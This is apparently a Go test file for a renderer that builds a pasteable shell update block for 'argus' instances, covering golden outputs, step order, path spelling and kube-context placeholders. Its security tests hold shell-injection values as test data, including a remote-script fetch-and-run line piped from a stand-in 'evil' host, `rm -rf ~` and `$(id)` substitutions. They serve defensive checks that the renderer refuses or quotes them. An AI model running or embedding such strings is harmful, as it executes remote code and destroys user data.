package updatecmd

import (
	"strings"
	"testing"
)

// V31-001 1-SHIM (VR13-UP) — THE BLOCK RUNS THE NEW PATH.
//
// The Environments page is how an operator updates: the runbooks say "take the block from the page".
// Until this change that block ended in `bash …/onboarding/update.sh`, which moves the executor and the
// router and nothing else — so the all-or-nothing update this release exists for could not be reached
// from the page at all. Release QA (2026-09-14) had to run the new path BY HAND on both instances.
//
// The block is now the sequence that QA proved on orderservice-compose and orderservice-k3d: pull,
// resolve the digest, `update discover` + its host script, `update plan`, then preflight.sh and apply.sh.
//
// ⛔ THE GOLDEN STRINGS ARE ASSERTED FOR EQUALITY. A contains-check keeps passing after a line is
// dropped, and a dropped line is exactly the class of defect this renderer exists to prevent.
//
// ⛔ AND IT RUNS IN A SUBSHELL. `set -euo pipefail` pasted into an interactive Git Bash would close the
// operator's window on the first failure; inside `( … )` it stops the block and nothing else.

const (
	someImg  = "ghcr.io/onedro1d/argus-runner@sha256:aa"
	someInst = "orderservice-compose"
	kitWin   = `C:\Users\api\argus-kits\orderservice-compose`
)

// the constant lines every block carries — named once so each golden below reads as its own shape
const (
	wantRouterState = `if [ -n "${ARGUS_ROUTER_STATE:-}" ]; then RS="$ARGUS_ROUTER_STATE"; elif [ -n "${LOCALAPPDATA:-}" ]; then RS="$LOCALAPPDATA/argus/router"; elif [ -n "${XDG_STATE_HOME:-}" ]; then RS="$XDG_STATE_HOME/argus/router"; else RS="$HOME/.local/state/argus/router"; fi`
	wantRSSpelling  = `if command -v cygpath >/dev/null 2>&1; then RS_M="$(cygpath -m "$RS")"; RS_U="$(cygpath -u "$RS")"; else RS_M="$RS"; RS_U="$RS"; fi`
	// AC-D60 (#394): the helpers run as the operator on a Linux non-root host; the decision is ONE line, before dr()
	wantHelperUser = `HELPER_USER=""; if [ "$(uname -s)" = Linux ] && [ "$(id -u)" != 0 ]; then DOCKER_REMAP="$(docker info --format '{{.SecurityOptions}}' 2>/dev/null || true) $(docker --version 2>/dev/null || true)"; case "$DOCKER_REMAP" in *rootless*|*userns*|*odman*) ;; *) HELPER_USER="$(id -u):$(id -g)" ;; esac; fi`
	wantDRWindows  = wantHelperUser + "\n" + `dr() { local rc=0 i; for i in 1 2 3; do MSYS_NO_PATHCONV=1 docker run --rm ${HELPER_USER:+--user "$HELPER_USER" -e HOME=/tmp} "$@" && return 0; rc=$?; [ "$rc" = 125 ] || return "$rc"; sleep 3; done; return "$rc"; }`
	wantDRPosix    = wantHelperUser + "\n" + `dr() { local rc=0 i; for i in 1 2 3; do docker run --rm ${HELPER_USER:+--user "$HELPER_USER" -e HOME=/tmp} "$@" && return 0; rc=$?; [ "$rc" = 125 ] || return "$rc"; sleep 3; done; return "$rc"; }`
	// AC-D58 (#392): the RepoDigest of $IMG's own repository, never the first one (a local import alias)
	wantDigest = `RD="$(docker image inspect --format '{{range .RepoDigests}}{{println .}}{{end}}' "$IMG")"` + "\n" +
		`IMG_REPO="${IMG%%@*}"; case "${IMG_REPO##*/}" in *:*) IMG_REPO="${IMG_REPO%:*}" ;; esac` + "\n" +
		`DIGEST="$(echo "$RD" | awk -v r="$IMG_REPO@" '{ sub(/[[:cntrl:]]+$/, "") } index($0, r) == 1 { print; exit }')"` + "\n" +
		`[ -n "$DIGEST" ] || { echo "REFUSED: the image $IMG has no RepoDigest in the repository $IMG_REPO, so there is no pullable digest to run the helpers from. Its RepoDigests are: $(echo "$RD" | awk '{ printf "%s ", $0 }')" >&2; exit 1; }`
	// AC-D56 (#390): the refusal names what undo/ holds and the steps not restored, and gives one literal way on
	wantKeepFailed = `if [ -f "$STAGE_U/outcome" ] && grep -qx rollback-failed "$STAGE_U/outcome"; then` + "\n" +
		`ACK="$STAGE_U.acknowledged-$(date -u +%Y%m%dT%H%M%SZ)"` + "\n" +
		`UNDO_HOLDS="$(ls -1 "$STAGE_U/undo" 2>/dev/null | awk '{ printf "%s ", $0 }' || true)"` + "\n" +
		`NOT_RESTORED="$(cat "$STAGE_U/unrestored" 2>/dev/null | awk '{ printf "%s ", $0 }' || true)"` + "\n" +
		`{ echo "REFUSED: the last update of this instance ended rollback-failed, so its staging folder is kept as evidence: $STAGE_U"; ` +
		`echo "  steps recorded as NOT restored: ${NOT_RESTORED:-none recorded — read $STAGE_U/progress.json}"; ` +
		`echo "  $STAGE_U/undo holds only what was captured before that update: ${UNDO_HOLDS:-nothing}"; ` +
		`echo "  It does NOT hold the kit or the env file. Check what the instance runs now before anything else."; ` +
		`echo "  To acknowledge this and continue, keeping the evidence, run:"; ` +
		`echo "    mv '$STAGE_U' '$ACK'"; ` +
		`echo "  then paste this block again."; } >&2` + "\n" +
		"exit 1\nfi"
	// AC-D53: a NOTE, never a refusal — see TestAC_D53_d_TheRuntimeStopsAnsweringAfterTheRecreate, which runs it
	wantNoteUnreach = `if [ -f "$STAGE_U/outcome" ] && grep -qx rollback-unreachable "$STAGE_U/outcome"; then echo "NOTE: the last update of this instance ended rollback-unreachable, and the recorded version of its executor reads unknown until an update completes. What that update saw:" >&2; if [ -f "$STAGE_U/outcome-note" ]; then sed -n '1s/^/  /p' "$STAGE_U/outcome-note" >&2 || true; else echo "  (not recorded)" >&2; fi; echo "This block now runs the update to $IMG." >&2; fi`
)

func TestRenderBlock_ComposeWindowsForm(t *testing.T) {
	block, placeholder := RenderBlock(Instance{Tier: "compose", InstanceID: someInst, Image: someImg, KitDir: kitWin})
	want := "(\n" +
		"set -euo pipefail\n" +
		"IMG='ghcr.io/onedro1d/argus-runner@sha256:aa'\n" +
		"KIT='C:/Users/api/argus-kits/orderservice-compose'\n" +
		"KIT_U='/c/Users/api/argus-kits/orderservice-compose'\n" +
		"STAGE='C:/Users/api/argus-kits/.argus-update-orderservice-compose'\n" +
		"STAGE_U='/c/Users/api/argus-kits/.argus-update-orderservice-compose'\n" +
		wantRouterState + "\n" +
		wantRSSpelling + "\n" +
		wantDRWindows + "\n" +
		wantKeepFailed + "\n" +
		wantNoteUnreach + "\n" +
		`rm -rf "$STAGE_U"` + "\n" +
		`mkdir -p "$STAGE_U"` + "\n" +
		`docker pull "$IMG"` + "\n" +
		wantDigest + "\n" +
		`dr --mount "type=bind,src=$STAGE,dst=$STAGE_U" --mount "type=bind,src=$RS_M,dst=$RS_U,readonly" "$IMG" update discover --stage "$STAGE_U" --kit "$KIT_U" --instance-id 'orderservice-compose' --tier compose --router-state "$RS_U"` + "\n" +
		`bash "$STAGE_U/discover.sh"` + "\n" +
		`dr --mount "type=bind,src=$STAGE,dst=$STAGE_U" --mount "type=bind,src=$KIT,dst=$KIT_U,readonly" --mount "type=bind,src=$RS_M,dst=$RS_U,readonly" "$IMG" update plan --stage "$STAGE_U" --kit "$KIT_U" --instance-id 'orderservice-compose' --tier compose --observed "$STAGE_U/observed.json" --router-state "$RS_U" --image "$IMG" --image-digest "$DIGEST"` + "\n" +
		`bash "$STAGE_U/preflight.sh"` + "\n" +
		`bash "$STAGE_U/apply.sh"` + "\n" +
		")"
	if block != want {
		t.Fatalf("the compose block is not THE BLOCK.\n  got:\n%s\n  want:\n%s", block, want)
	}
	if placeholder {
		t.Error("compose has no cluster, so it can never need the <KUBE_CONTEXT> placeholder")
	}
}

// k3d with a recorded context AND a recorded kubeconfig: each is assigned ONCE, single-quoted, and read by
// both verbs — the kubeconfig in the form bash can open (the same drive-letter rule as the kit path).
func TestRenderBlock_K3dWithContextAndKubeconfig_WindowsForm(t *testing.T) {
	block, placeholder := RenderBlock(Instance{
		Tier: "k3d", InstanceID: "social-k3d", Image: someImg, KitDir: `C:\Users\api\argus-kits\social-k3d`,
		KubeContext: "k3d-argus", Kubeconfig: `C:\Users\api\.kube\config`,
	})
	for _, want := range []string{
		"KCTX='k3d-argus'\n",
		"KCFG='/c/Users/api/.kube/config'\n",
		`update discover --stage "$STAGE_U" --kit "$KIT_U" --instance-id 'social-k3d' --tier k3d --router-state "$RS_U" --kube-context "$KCTX" --kubeconfig "$KCFG"` + "\n",
		`update plan --stage "$STAGE_U" --kit "$KIT_U" --instance-id 'social-k3d' --tier k3d --observed "$STAGE_U/observed.json" --router-state "$RS_U" --kube-context "$KCTX" --kubeconfig "$KCFG" --image "$IMG" --image-digest "$DIGEST"` + "\n",
	} {
		if !strings.Contains(block, want) {
			t.Errorf("the k3d block is missing %q:\n%s", want, block)
		}
	}
	if placeholder {
		t.Error("a recorded context must not be reported as a placeholder")
	}
}

// A context without a kubeconfig renders the context alone: `--kubeconfig` appears ONLY when
// onboarding was given one.
func TestRenderBlock_KubeconfigOnlyWhenOnboardingWasGivenOne(t *testing.T) {
	block, _ := RenderBlock(Instance{Tier: "managed", InstanceID: "social-aks", Image: someImg, KitDir: kitWin, KubeContext: "example-overlay"})
	if !strings.Contains(block, "KCTX='example-overlay'\n") || strings.Count(block, `--kube-context "$KCTX"`) != 2 {
		t.Errorf("managed with a context must assign it once and pass it to discover AND plan:\n%s", block)
	}
	if strings.Contains(block, "--kubeconfig") || strings.Contains(block, "KCFG=") {
		t.Errorf("--kubeconfig rendered although onboarding was given none:\n%s", block)
	}
}

// The POSIX form: the kit dir carries no drive letter, so both spellings are the path as stored and no
// path-conversion switch appears anywhere.
func TestRenderBlock_ManagedPosixForm(t *testing.T) {
	block, placeholder := RenderBlock(Instance{
		Tier: "managed", InstanceID: "orders-aks", Image: someImg, KitDir: "/home/api/argus-kits/orders-aks",
		KubeContext: "example-overlay", Kubeconfig: "/home/api/.kube/config",
	})
	for _, want := range []string{
		"KIT='/home/api/argus-kits/orders-aks'\n",
		"KIT_U='/home/api/argus-kits/orders-aks'\n",
		"STAGE='/home/api/argus-kits/.argus-update-orders-aks'\n",
		"STAGE_U='/home/api/argus-kits/.argus-update-orders-aks'\n",
		"KCFG='/home/api/.kube/config'\n",
		wantDRPosix + "\n",
	} {
		if !strings.Contains(block, want) {
			t.Errorf("the POSIX block is missing %q:\n%s", want, block)
		}
	}
	if strings.Contains(block, "MSYS_NO_PATHCONV") {
		t.Errorf("a POSIX kit dir rendered the Windows path switch:\n%s", block)
	}
	if placeholder {
		t.Error("a recorded context must not be reported as a placeholder")
	}
}

// ── THE ONE EXCEPTION TO "NEVER A TEMPLATE", BY OWNER DECISION ───────────────────────────────────
//
// An instance onboarded before 0.3.29 has no recorded context. For those ONLY the block carries
// `<KUBE_CONTEXT>` — ONCE, in the one assignment both verbs read — so an unedited paste fails LOUDLY
// (kubectl knows no such context) instead of acting on whatever context happens to be current.
func TestRenderBlock_LegacyK8sRendersTheOnePlaceholder(t *testing.T) {
	for _, tier := range []string{"k3d", "managed"} {
		block, placeholder := RenderBlock(Instance{Tier: tier, InstanceID: someInst, Image: someImg, KitDir: kitWin})
		if block == "" {
			t.Fatalf("tier %s: a legacy instance must still get a block — the placeholder is the whole point", tier)
		}
		if !placeholder {
			t.Errorf("tier %s: placeholder=false for an instance with no recorded context", tier)
		}
		if !strings.Contains(block, "KCTX='<KUBE_CONTEXT>'\n") {
			t.Errorf("tier %s: the legacy block must assign the literal placeholder, got:\n%s", tier, block)
		}
		if n := strings.Count(block, "<"); n != 1 {
			t.Errorf("tier %s: %d angle-bracket tokens, want exactly ONE (the placeholder is the single exception):\n%s", tier, n, block)
		}
	}
	block, placeholder := RenderBlock(Instance{Tier: "compose", InstanceID: someInst, Image: someImg, KitDir: kitWin})
	if placeholder || strings.Contains(block, "--kube-context") {
		t.Errorf("compose rendered a kube-context (placeholder=%v):\n%s", placeholder, block)
	}
}

// A compose row that somehow carries a context (a re-onboard that changed tier, a hand edit) still
// renders none: a flag the compose path does not use is noise the operator will read as meaning something.
func TestRenderBlock_ComposeIgnoresKubeFields(t *testing.T) {
	block, placeholder := RenderBlock(Instance{Tier: "compose", InstanceID: someInst, Image: someImg, KitDir: kitWin, KubeContext: "k3d-argus", Kubeconfig: "/x"})
	if placeholder || strings.Contains(block, "--kube") || strings.Contains(block, "KCTX") {
		t.Errorf("compose rendered kube arguments (placeholder=%v):\n%s", placeholder, block)
	}
}

// 🚩 SEC-3: every value is executor-written and crosses into a shell on another machine. Single-quoting
// cannot express a lone quote, so a value carrying one is REFUSED — the whole block, not a repaired line.
func TestRenderBlock_ASingleQuoteIsRefusedNotRepaired(t *testing.T) {
	base := Instance{Tier: "k3d", InstanceID: someInst, Image: someImg, KitDir: kitWin, KubeContext: "k3d-argus", Kubeconfig: "/home/api/.kube/config"}
	cases := map[string]func(in Instance) Instance{
		"kube context":  func(in Instance) Instance { in.KubeContext = `k3d'; id; echo '`; return in },
		"kubeconfig":    func(in Instance) Instance { in.Kubeconfig = `/k'; id; echo '`; return in },
		"kit dir":       func(in Instance) Instance { in.KitDir = `/kits/x'; id; echo '`; return in },
		"instance id":   func(in Instance) Instance { in.InstanceID = `x'y`; return in },
		"image":         func(in Instance) Instance { in.Image = `img'`; return in },
		"newline in it": func(in Instance) Instance { in.KubeContext = "k3d\nrm -rf ~"; return in },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			block, placeholder := RenderBlock(mutate(base))
			if block != "" || placeholder {
				t.Fatalf("a %s single-quoting cannot express was rendered instead of refused (placeholder=%v):\n%s", name, placeholder, block)
			}
		})
	}
}

// "" IS AN ANSWER — no kit dir, no image, no id, a tier the control plane does not store, or a kit dir
// with no parent to put the staging directory in.
func TestRenderBlock_NothingToSayRendersNothing(t *testing.T) {
	cases := map[string]Instance{
		"no kit dir":           {Tier: "k3d", InstanceID: someInst, Image: someImg},
		"no image":             {Tier: "k3d", InstanceID: someInst, KitDir: kitWin},
		"no instance":          {Tier: "k3d", Image: someImg, KitDir: kitWin},
		"unknown tier":         {Tier: "aks", InstanceID: someInst, Image: someImg, KitDir: kitWin},
		"empty tier":           {InstanceID: someInst, Image: someImg, KitDir: kitWin},
		"a kit with no parent": {Tier: "compose", InstanceID: someInst, Image: someImg, KitDir: "kit"},
		// ⛔ the id builds the stage path the block `rm -rf`s: a traversal would aim that at any folder
		"an instance id that walks out of the kit's parent": {Tier: "compose", InstanceID: "x/../../Documents", Image: someImg, KitDir: kitWin},
		"an instance id onboarding would refuse":            {Tier: "compose", InstanceID: "Orders", Image: someImg, KitDir: kitWin},
		// ⛔ a comma splits every --mount spec, and docker's exit 125 would be retried as Rancher's flake
		"a kit path with a comma": {Tier: "compose", InstanceID: someInst, Image: someImg, KitDir: `C:\Users\Doe, J\kits\order`},
	}
	for name, in := range cases {
		if block, placeholder := RenderBlock(in); block != "" || placeholder {
			t.Errorf("%s: rendered (placeholder=%v):\n%s", name, placeholder, block)
		}
	}
}

// Commands only — the owner's samples rule: no comment line, no blank line, no trailing newline, and the
// whole block is ONE subshell.
func TestRenderBlock_IsCommandsOnly(t *testing.T) {
	for _, in := range []Instance{
		{Tier: "compose", InstanceID: someInst, Image: someImg, KitDir: kitWin},
		{Tier: "k3d", InstanceID: someInst, Image: someImg, KitDir: "/kits/x", KubeContext: "k3d-argus"},
		{Tier: "managed", InstanceID: someInst, Image: someImg, KitDir: kitWin},
	} {
		block, _ := RenderBlock(in)
		lines := strings.Split(block, "\n")
		if lines[0] != "(" || lines[len(lines)-1] != ")" {
			t.Errorf("tier %s: the block is not one subshell (first %q, last %q)", in.Tier, lines[0], lines[len(lines)-1])
		}
		for _, l := range lines {
			if strings.HasPrefix(strings.TrimSpace(l), "#") || strings.TrimSpace(l) == "" {
				t.Errorf("tier %s: a comment or blank line in a commands-only block: %q", in.Tier, l)
			}
		}
		if strings.HasSuffix(block, "\n") {
			t.Errorf("tier %s: trailing newline", in.Tier)
		}
	}
}

// Order is load-bearing: the image must be on the machine before its digest is read and before its verbs
// run; discovery's reading must exist before the plan; the preflight must pass before apply.
func TestRenderBlock_OrderIsPullDiscoverPlanPreflightApply(t *testing.T) {
	block, _ := RenderBlock(Instance{Tier: "k3d", InstanceID: someInst, Image: someImg, KitDir: kitWin, KubeContext: "k3d-argus"})
	marks := []string{`docker pull "$IMG"`, "DIGEST=", " update discover ", `bash "$STAGE_U/discover.sh"`, " update plan ",
		`bash "$STAGE_U/preflight.sh"`, `bash "$STAGE_U/apply.sh"`}
	last := -1
	for _, m := range marks {
		i := strings.Index(block, m)
		if i <= last {
			t.Fatalf("%q is out of order (at %d, previous mark at %d):\n%s", m, i, last, block)
		}
		last = i
	}
	if strings.Contains(block, "update.sh") {
		t.Errorf("the block still runs update.sh — the page would keep teaching the path this release retires:\n%s", block)
	}
}

// ⛔ THE STAGE SITS BESIDE THE KIT (1-STAGE): the kit swap is a rename, so the staged kit must be on the
// same filesystem as the kit it replaces — and never inside it, where A-1's rename would carry it along.
func TestRenderBlock_TheStageSitsBesideTheKit(t *testing.T) {
	block, _ := RenderBlock(Instance{Tier: "compose", InstanceID: "memstore-compose", Image: someImg, KitDir: `D:\kits\memstore`})
	if !strings.Contains(block, "STAGE='D:/kits/.argus-update-memstore-compose'\n") ||
		!strings.Contains(block, "STAGE_U='/d/kits/.argus-update-memstore-compose'\n") {
		t.Errorf("the stage is not beside the kit:\n%s", block)
	}
}

// ⛔ EVERYTHING OUTSIDE SINGLE QUOTES IS CONSTANT. Strip every single-quoted span: what is left must be
// IDENTICAL for a benign instance and a hostile one. If executor-written text can change one byte
// outside the quotes, it has become code.
func TestRenderBlock_ExecutorTextCannotLeaveTheQuotes(t *testing.T) {
	benign := Instance{Tier: "k3d", InstanceID: someInst, Image: someImg, KitDir: kitWin, KubeContext: "k3d-argus", Kubeconfig: `C:\Users\api\.kube\config`}
	skeleton, _ := RenderBlock(benign)
	skeleton = stripSingleQuoted(skeleton)
	for name, in := range map[string]Instance{
		"kit with a command separator": {Tier: "k3d", InstanceID: someInst, Image: someImg, KitDir: `C:\kits\x; curl http://evil/i.sh | sh`, KubeContext: "k3d-argus", Kubeconfig: `C:\Users\api\.kube\config`},
		"context with a substitution":  {Tier: "k3d", InstanceID: someInst, Image: someImg, KitDir: kitWin, KubeContext: "k3d-$(id)", Kubeconfig: `C:\Users\api\.kube\config`},
		"kubeconfig with a backtick":   {Tier: "k3d", InstanceID: someInst, Image: someImg, KitDir: kitWin, KubeContext: "k3d-argus", Kubeconfig: "C:\\k`id`"},
		"image with an ampersand":      {Tier: "k3d", InstanceID: someInst, Image: "img && rm -rf ~", KitDir: kitWin, KubeContext: "k3d-argus", Kubeconfig: `C:\Users\api\.kube\config`},
	} {
		block, _ := RenderBlock(in)
		if block == "" {
			t.Errorf("%s: refused, but single-quoting expresses it — over-refusal silently withdraws the feature", name)
			continue
		}
		if got := stripSingleQuoted(block); got != skeleton {
			t.Errorf("%s: executor-written text changed the block OUTSIDE the quotes.\n  residue: %q\n  want:    %q", name, got, skeleton)
		}
	}
}

// stripSingleQuoted removes every 'single-quoted span' (the quotes included). Inside single quotes bash
// treats every byte literally, so what remains is exactly the part bash would interpret.
func stripSingleQuoted(s string) string {
	var b strings.Builder
	in := false
	for _, r := range s {
		if r == '\'' {
			in = !in
			continue
		}
		if !in {
			b.WriteRune(r)
		}
	}
	return b.String()
}
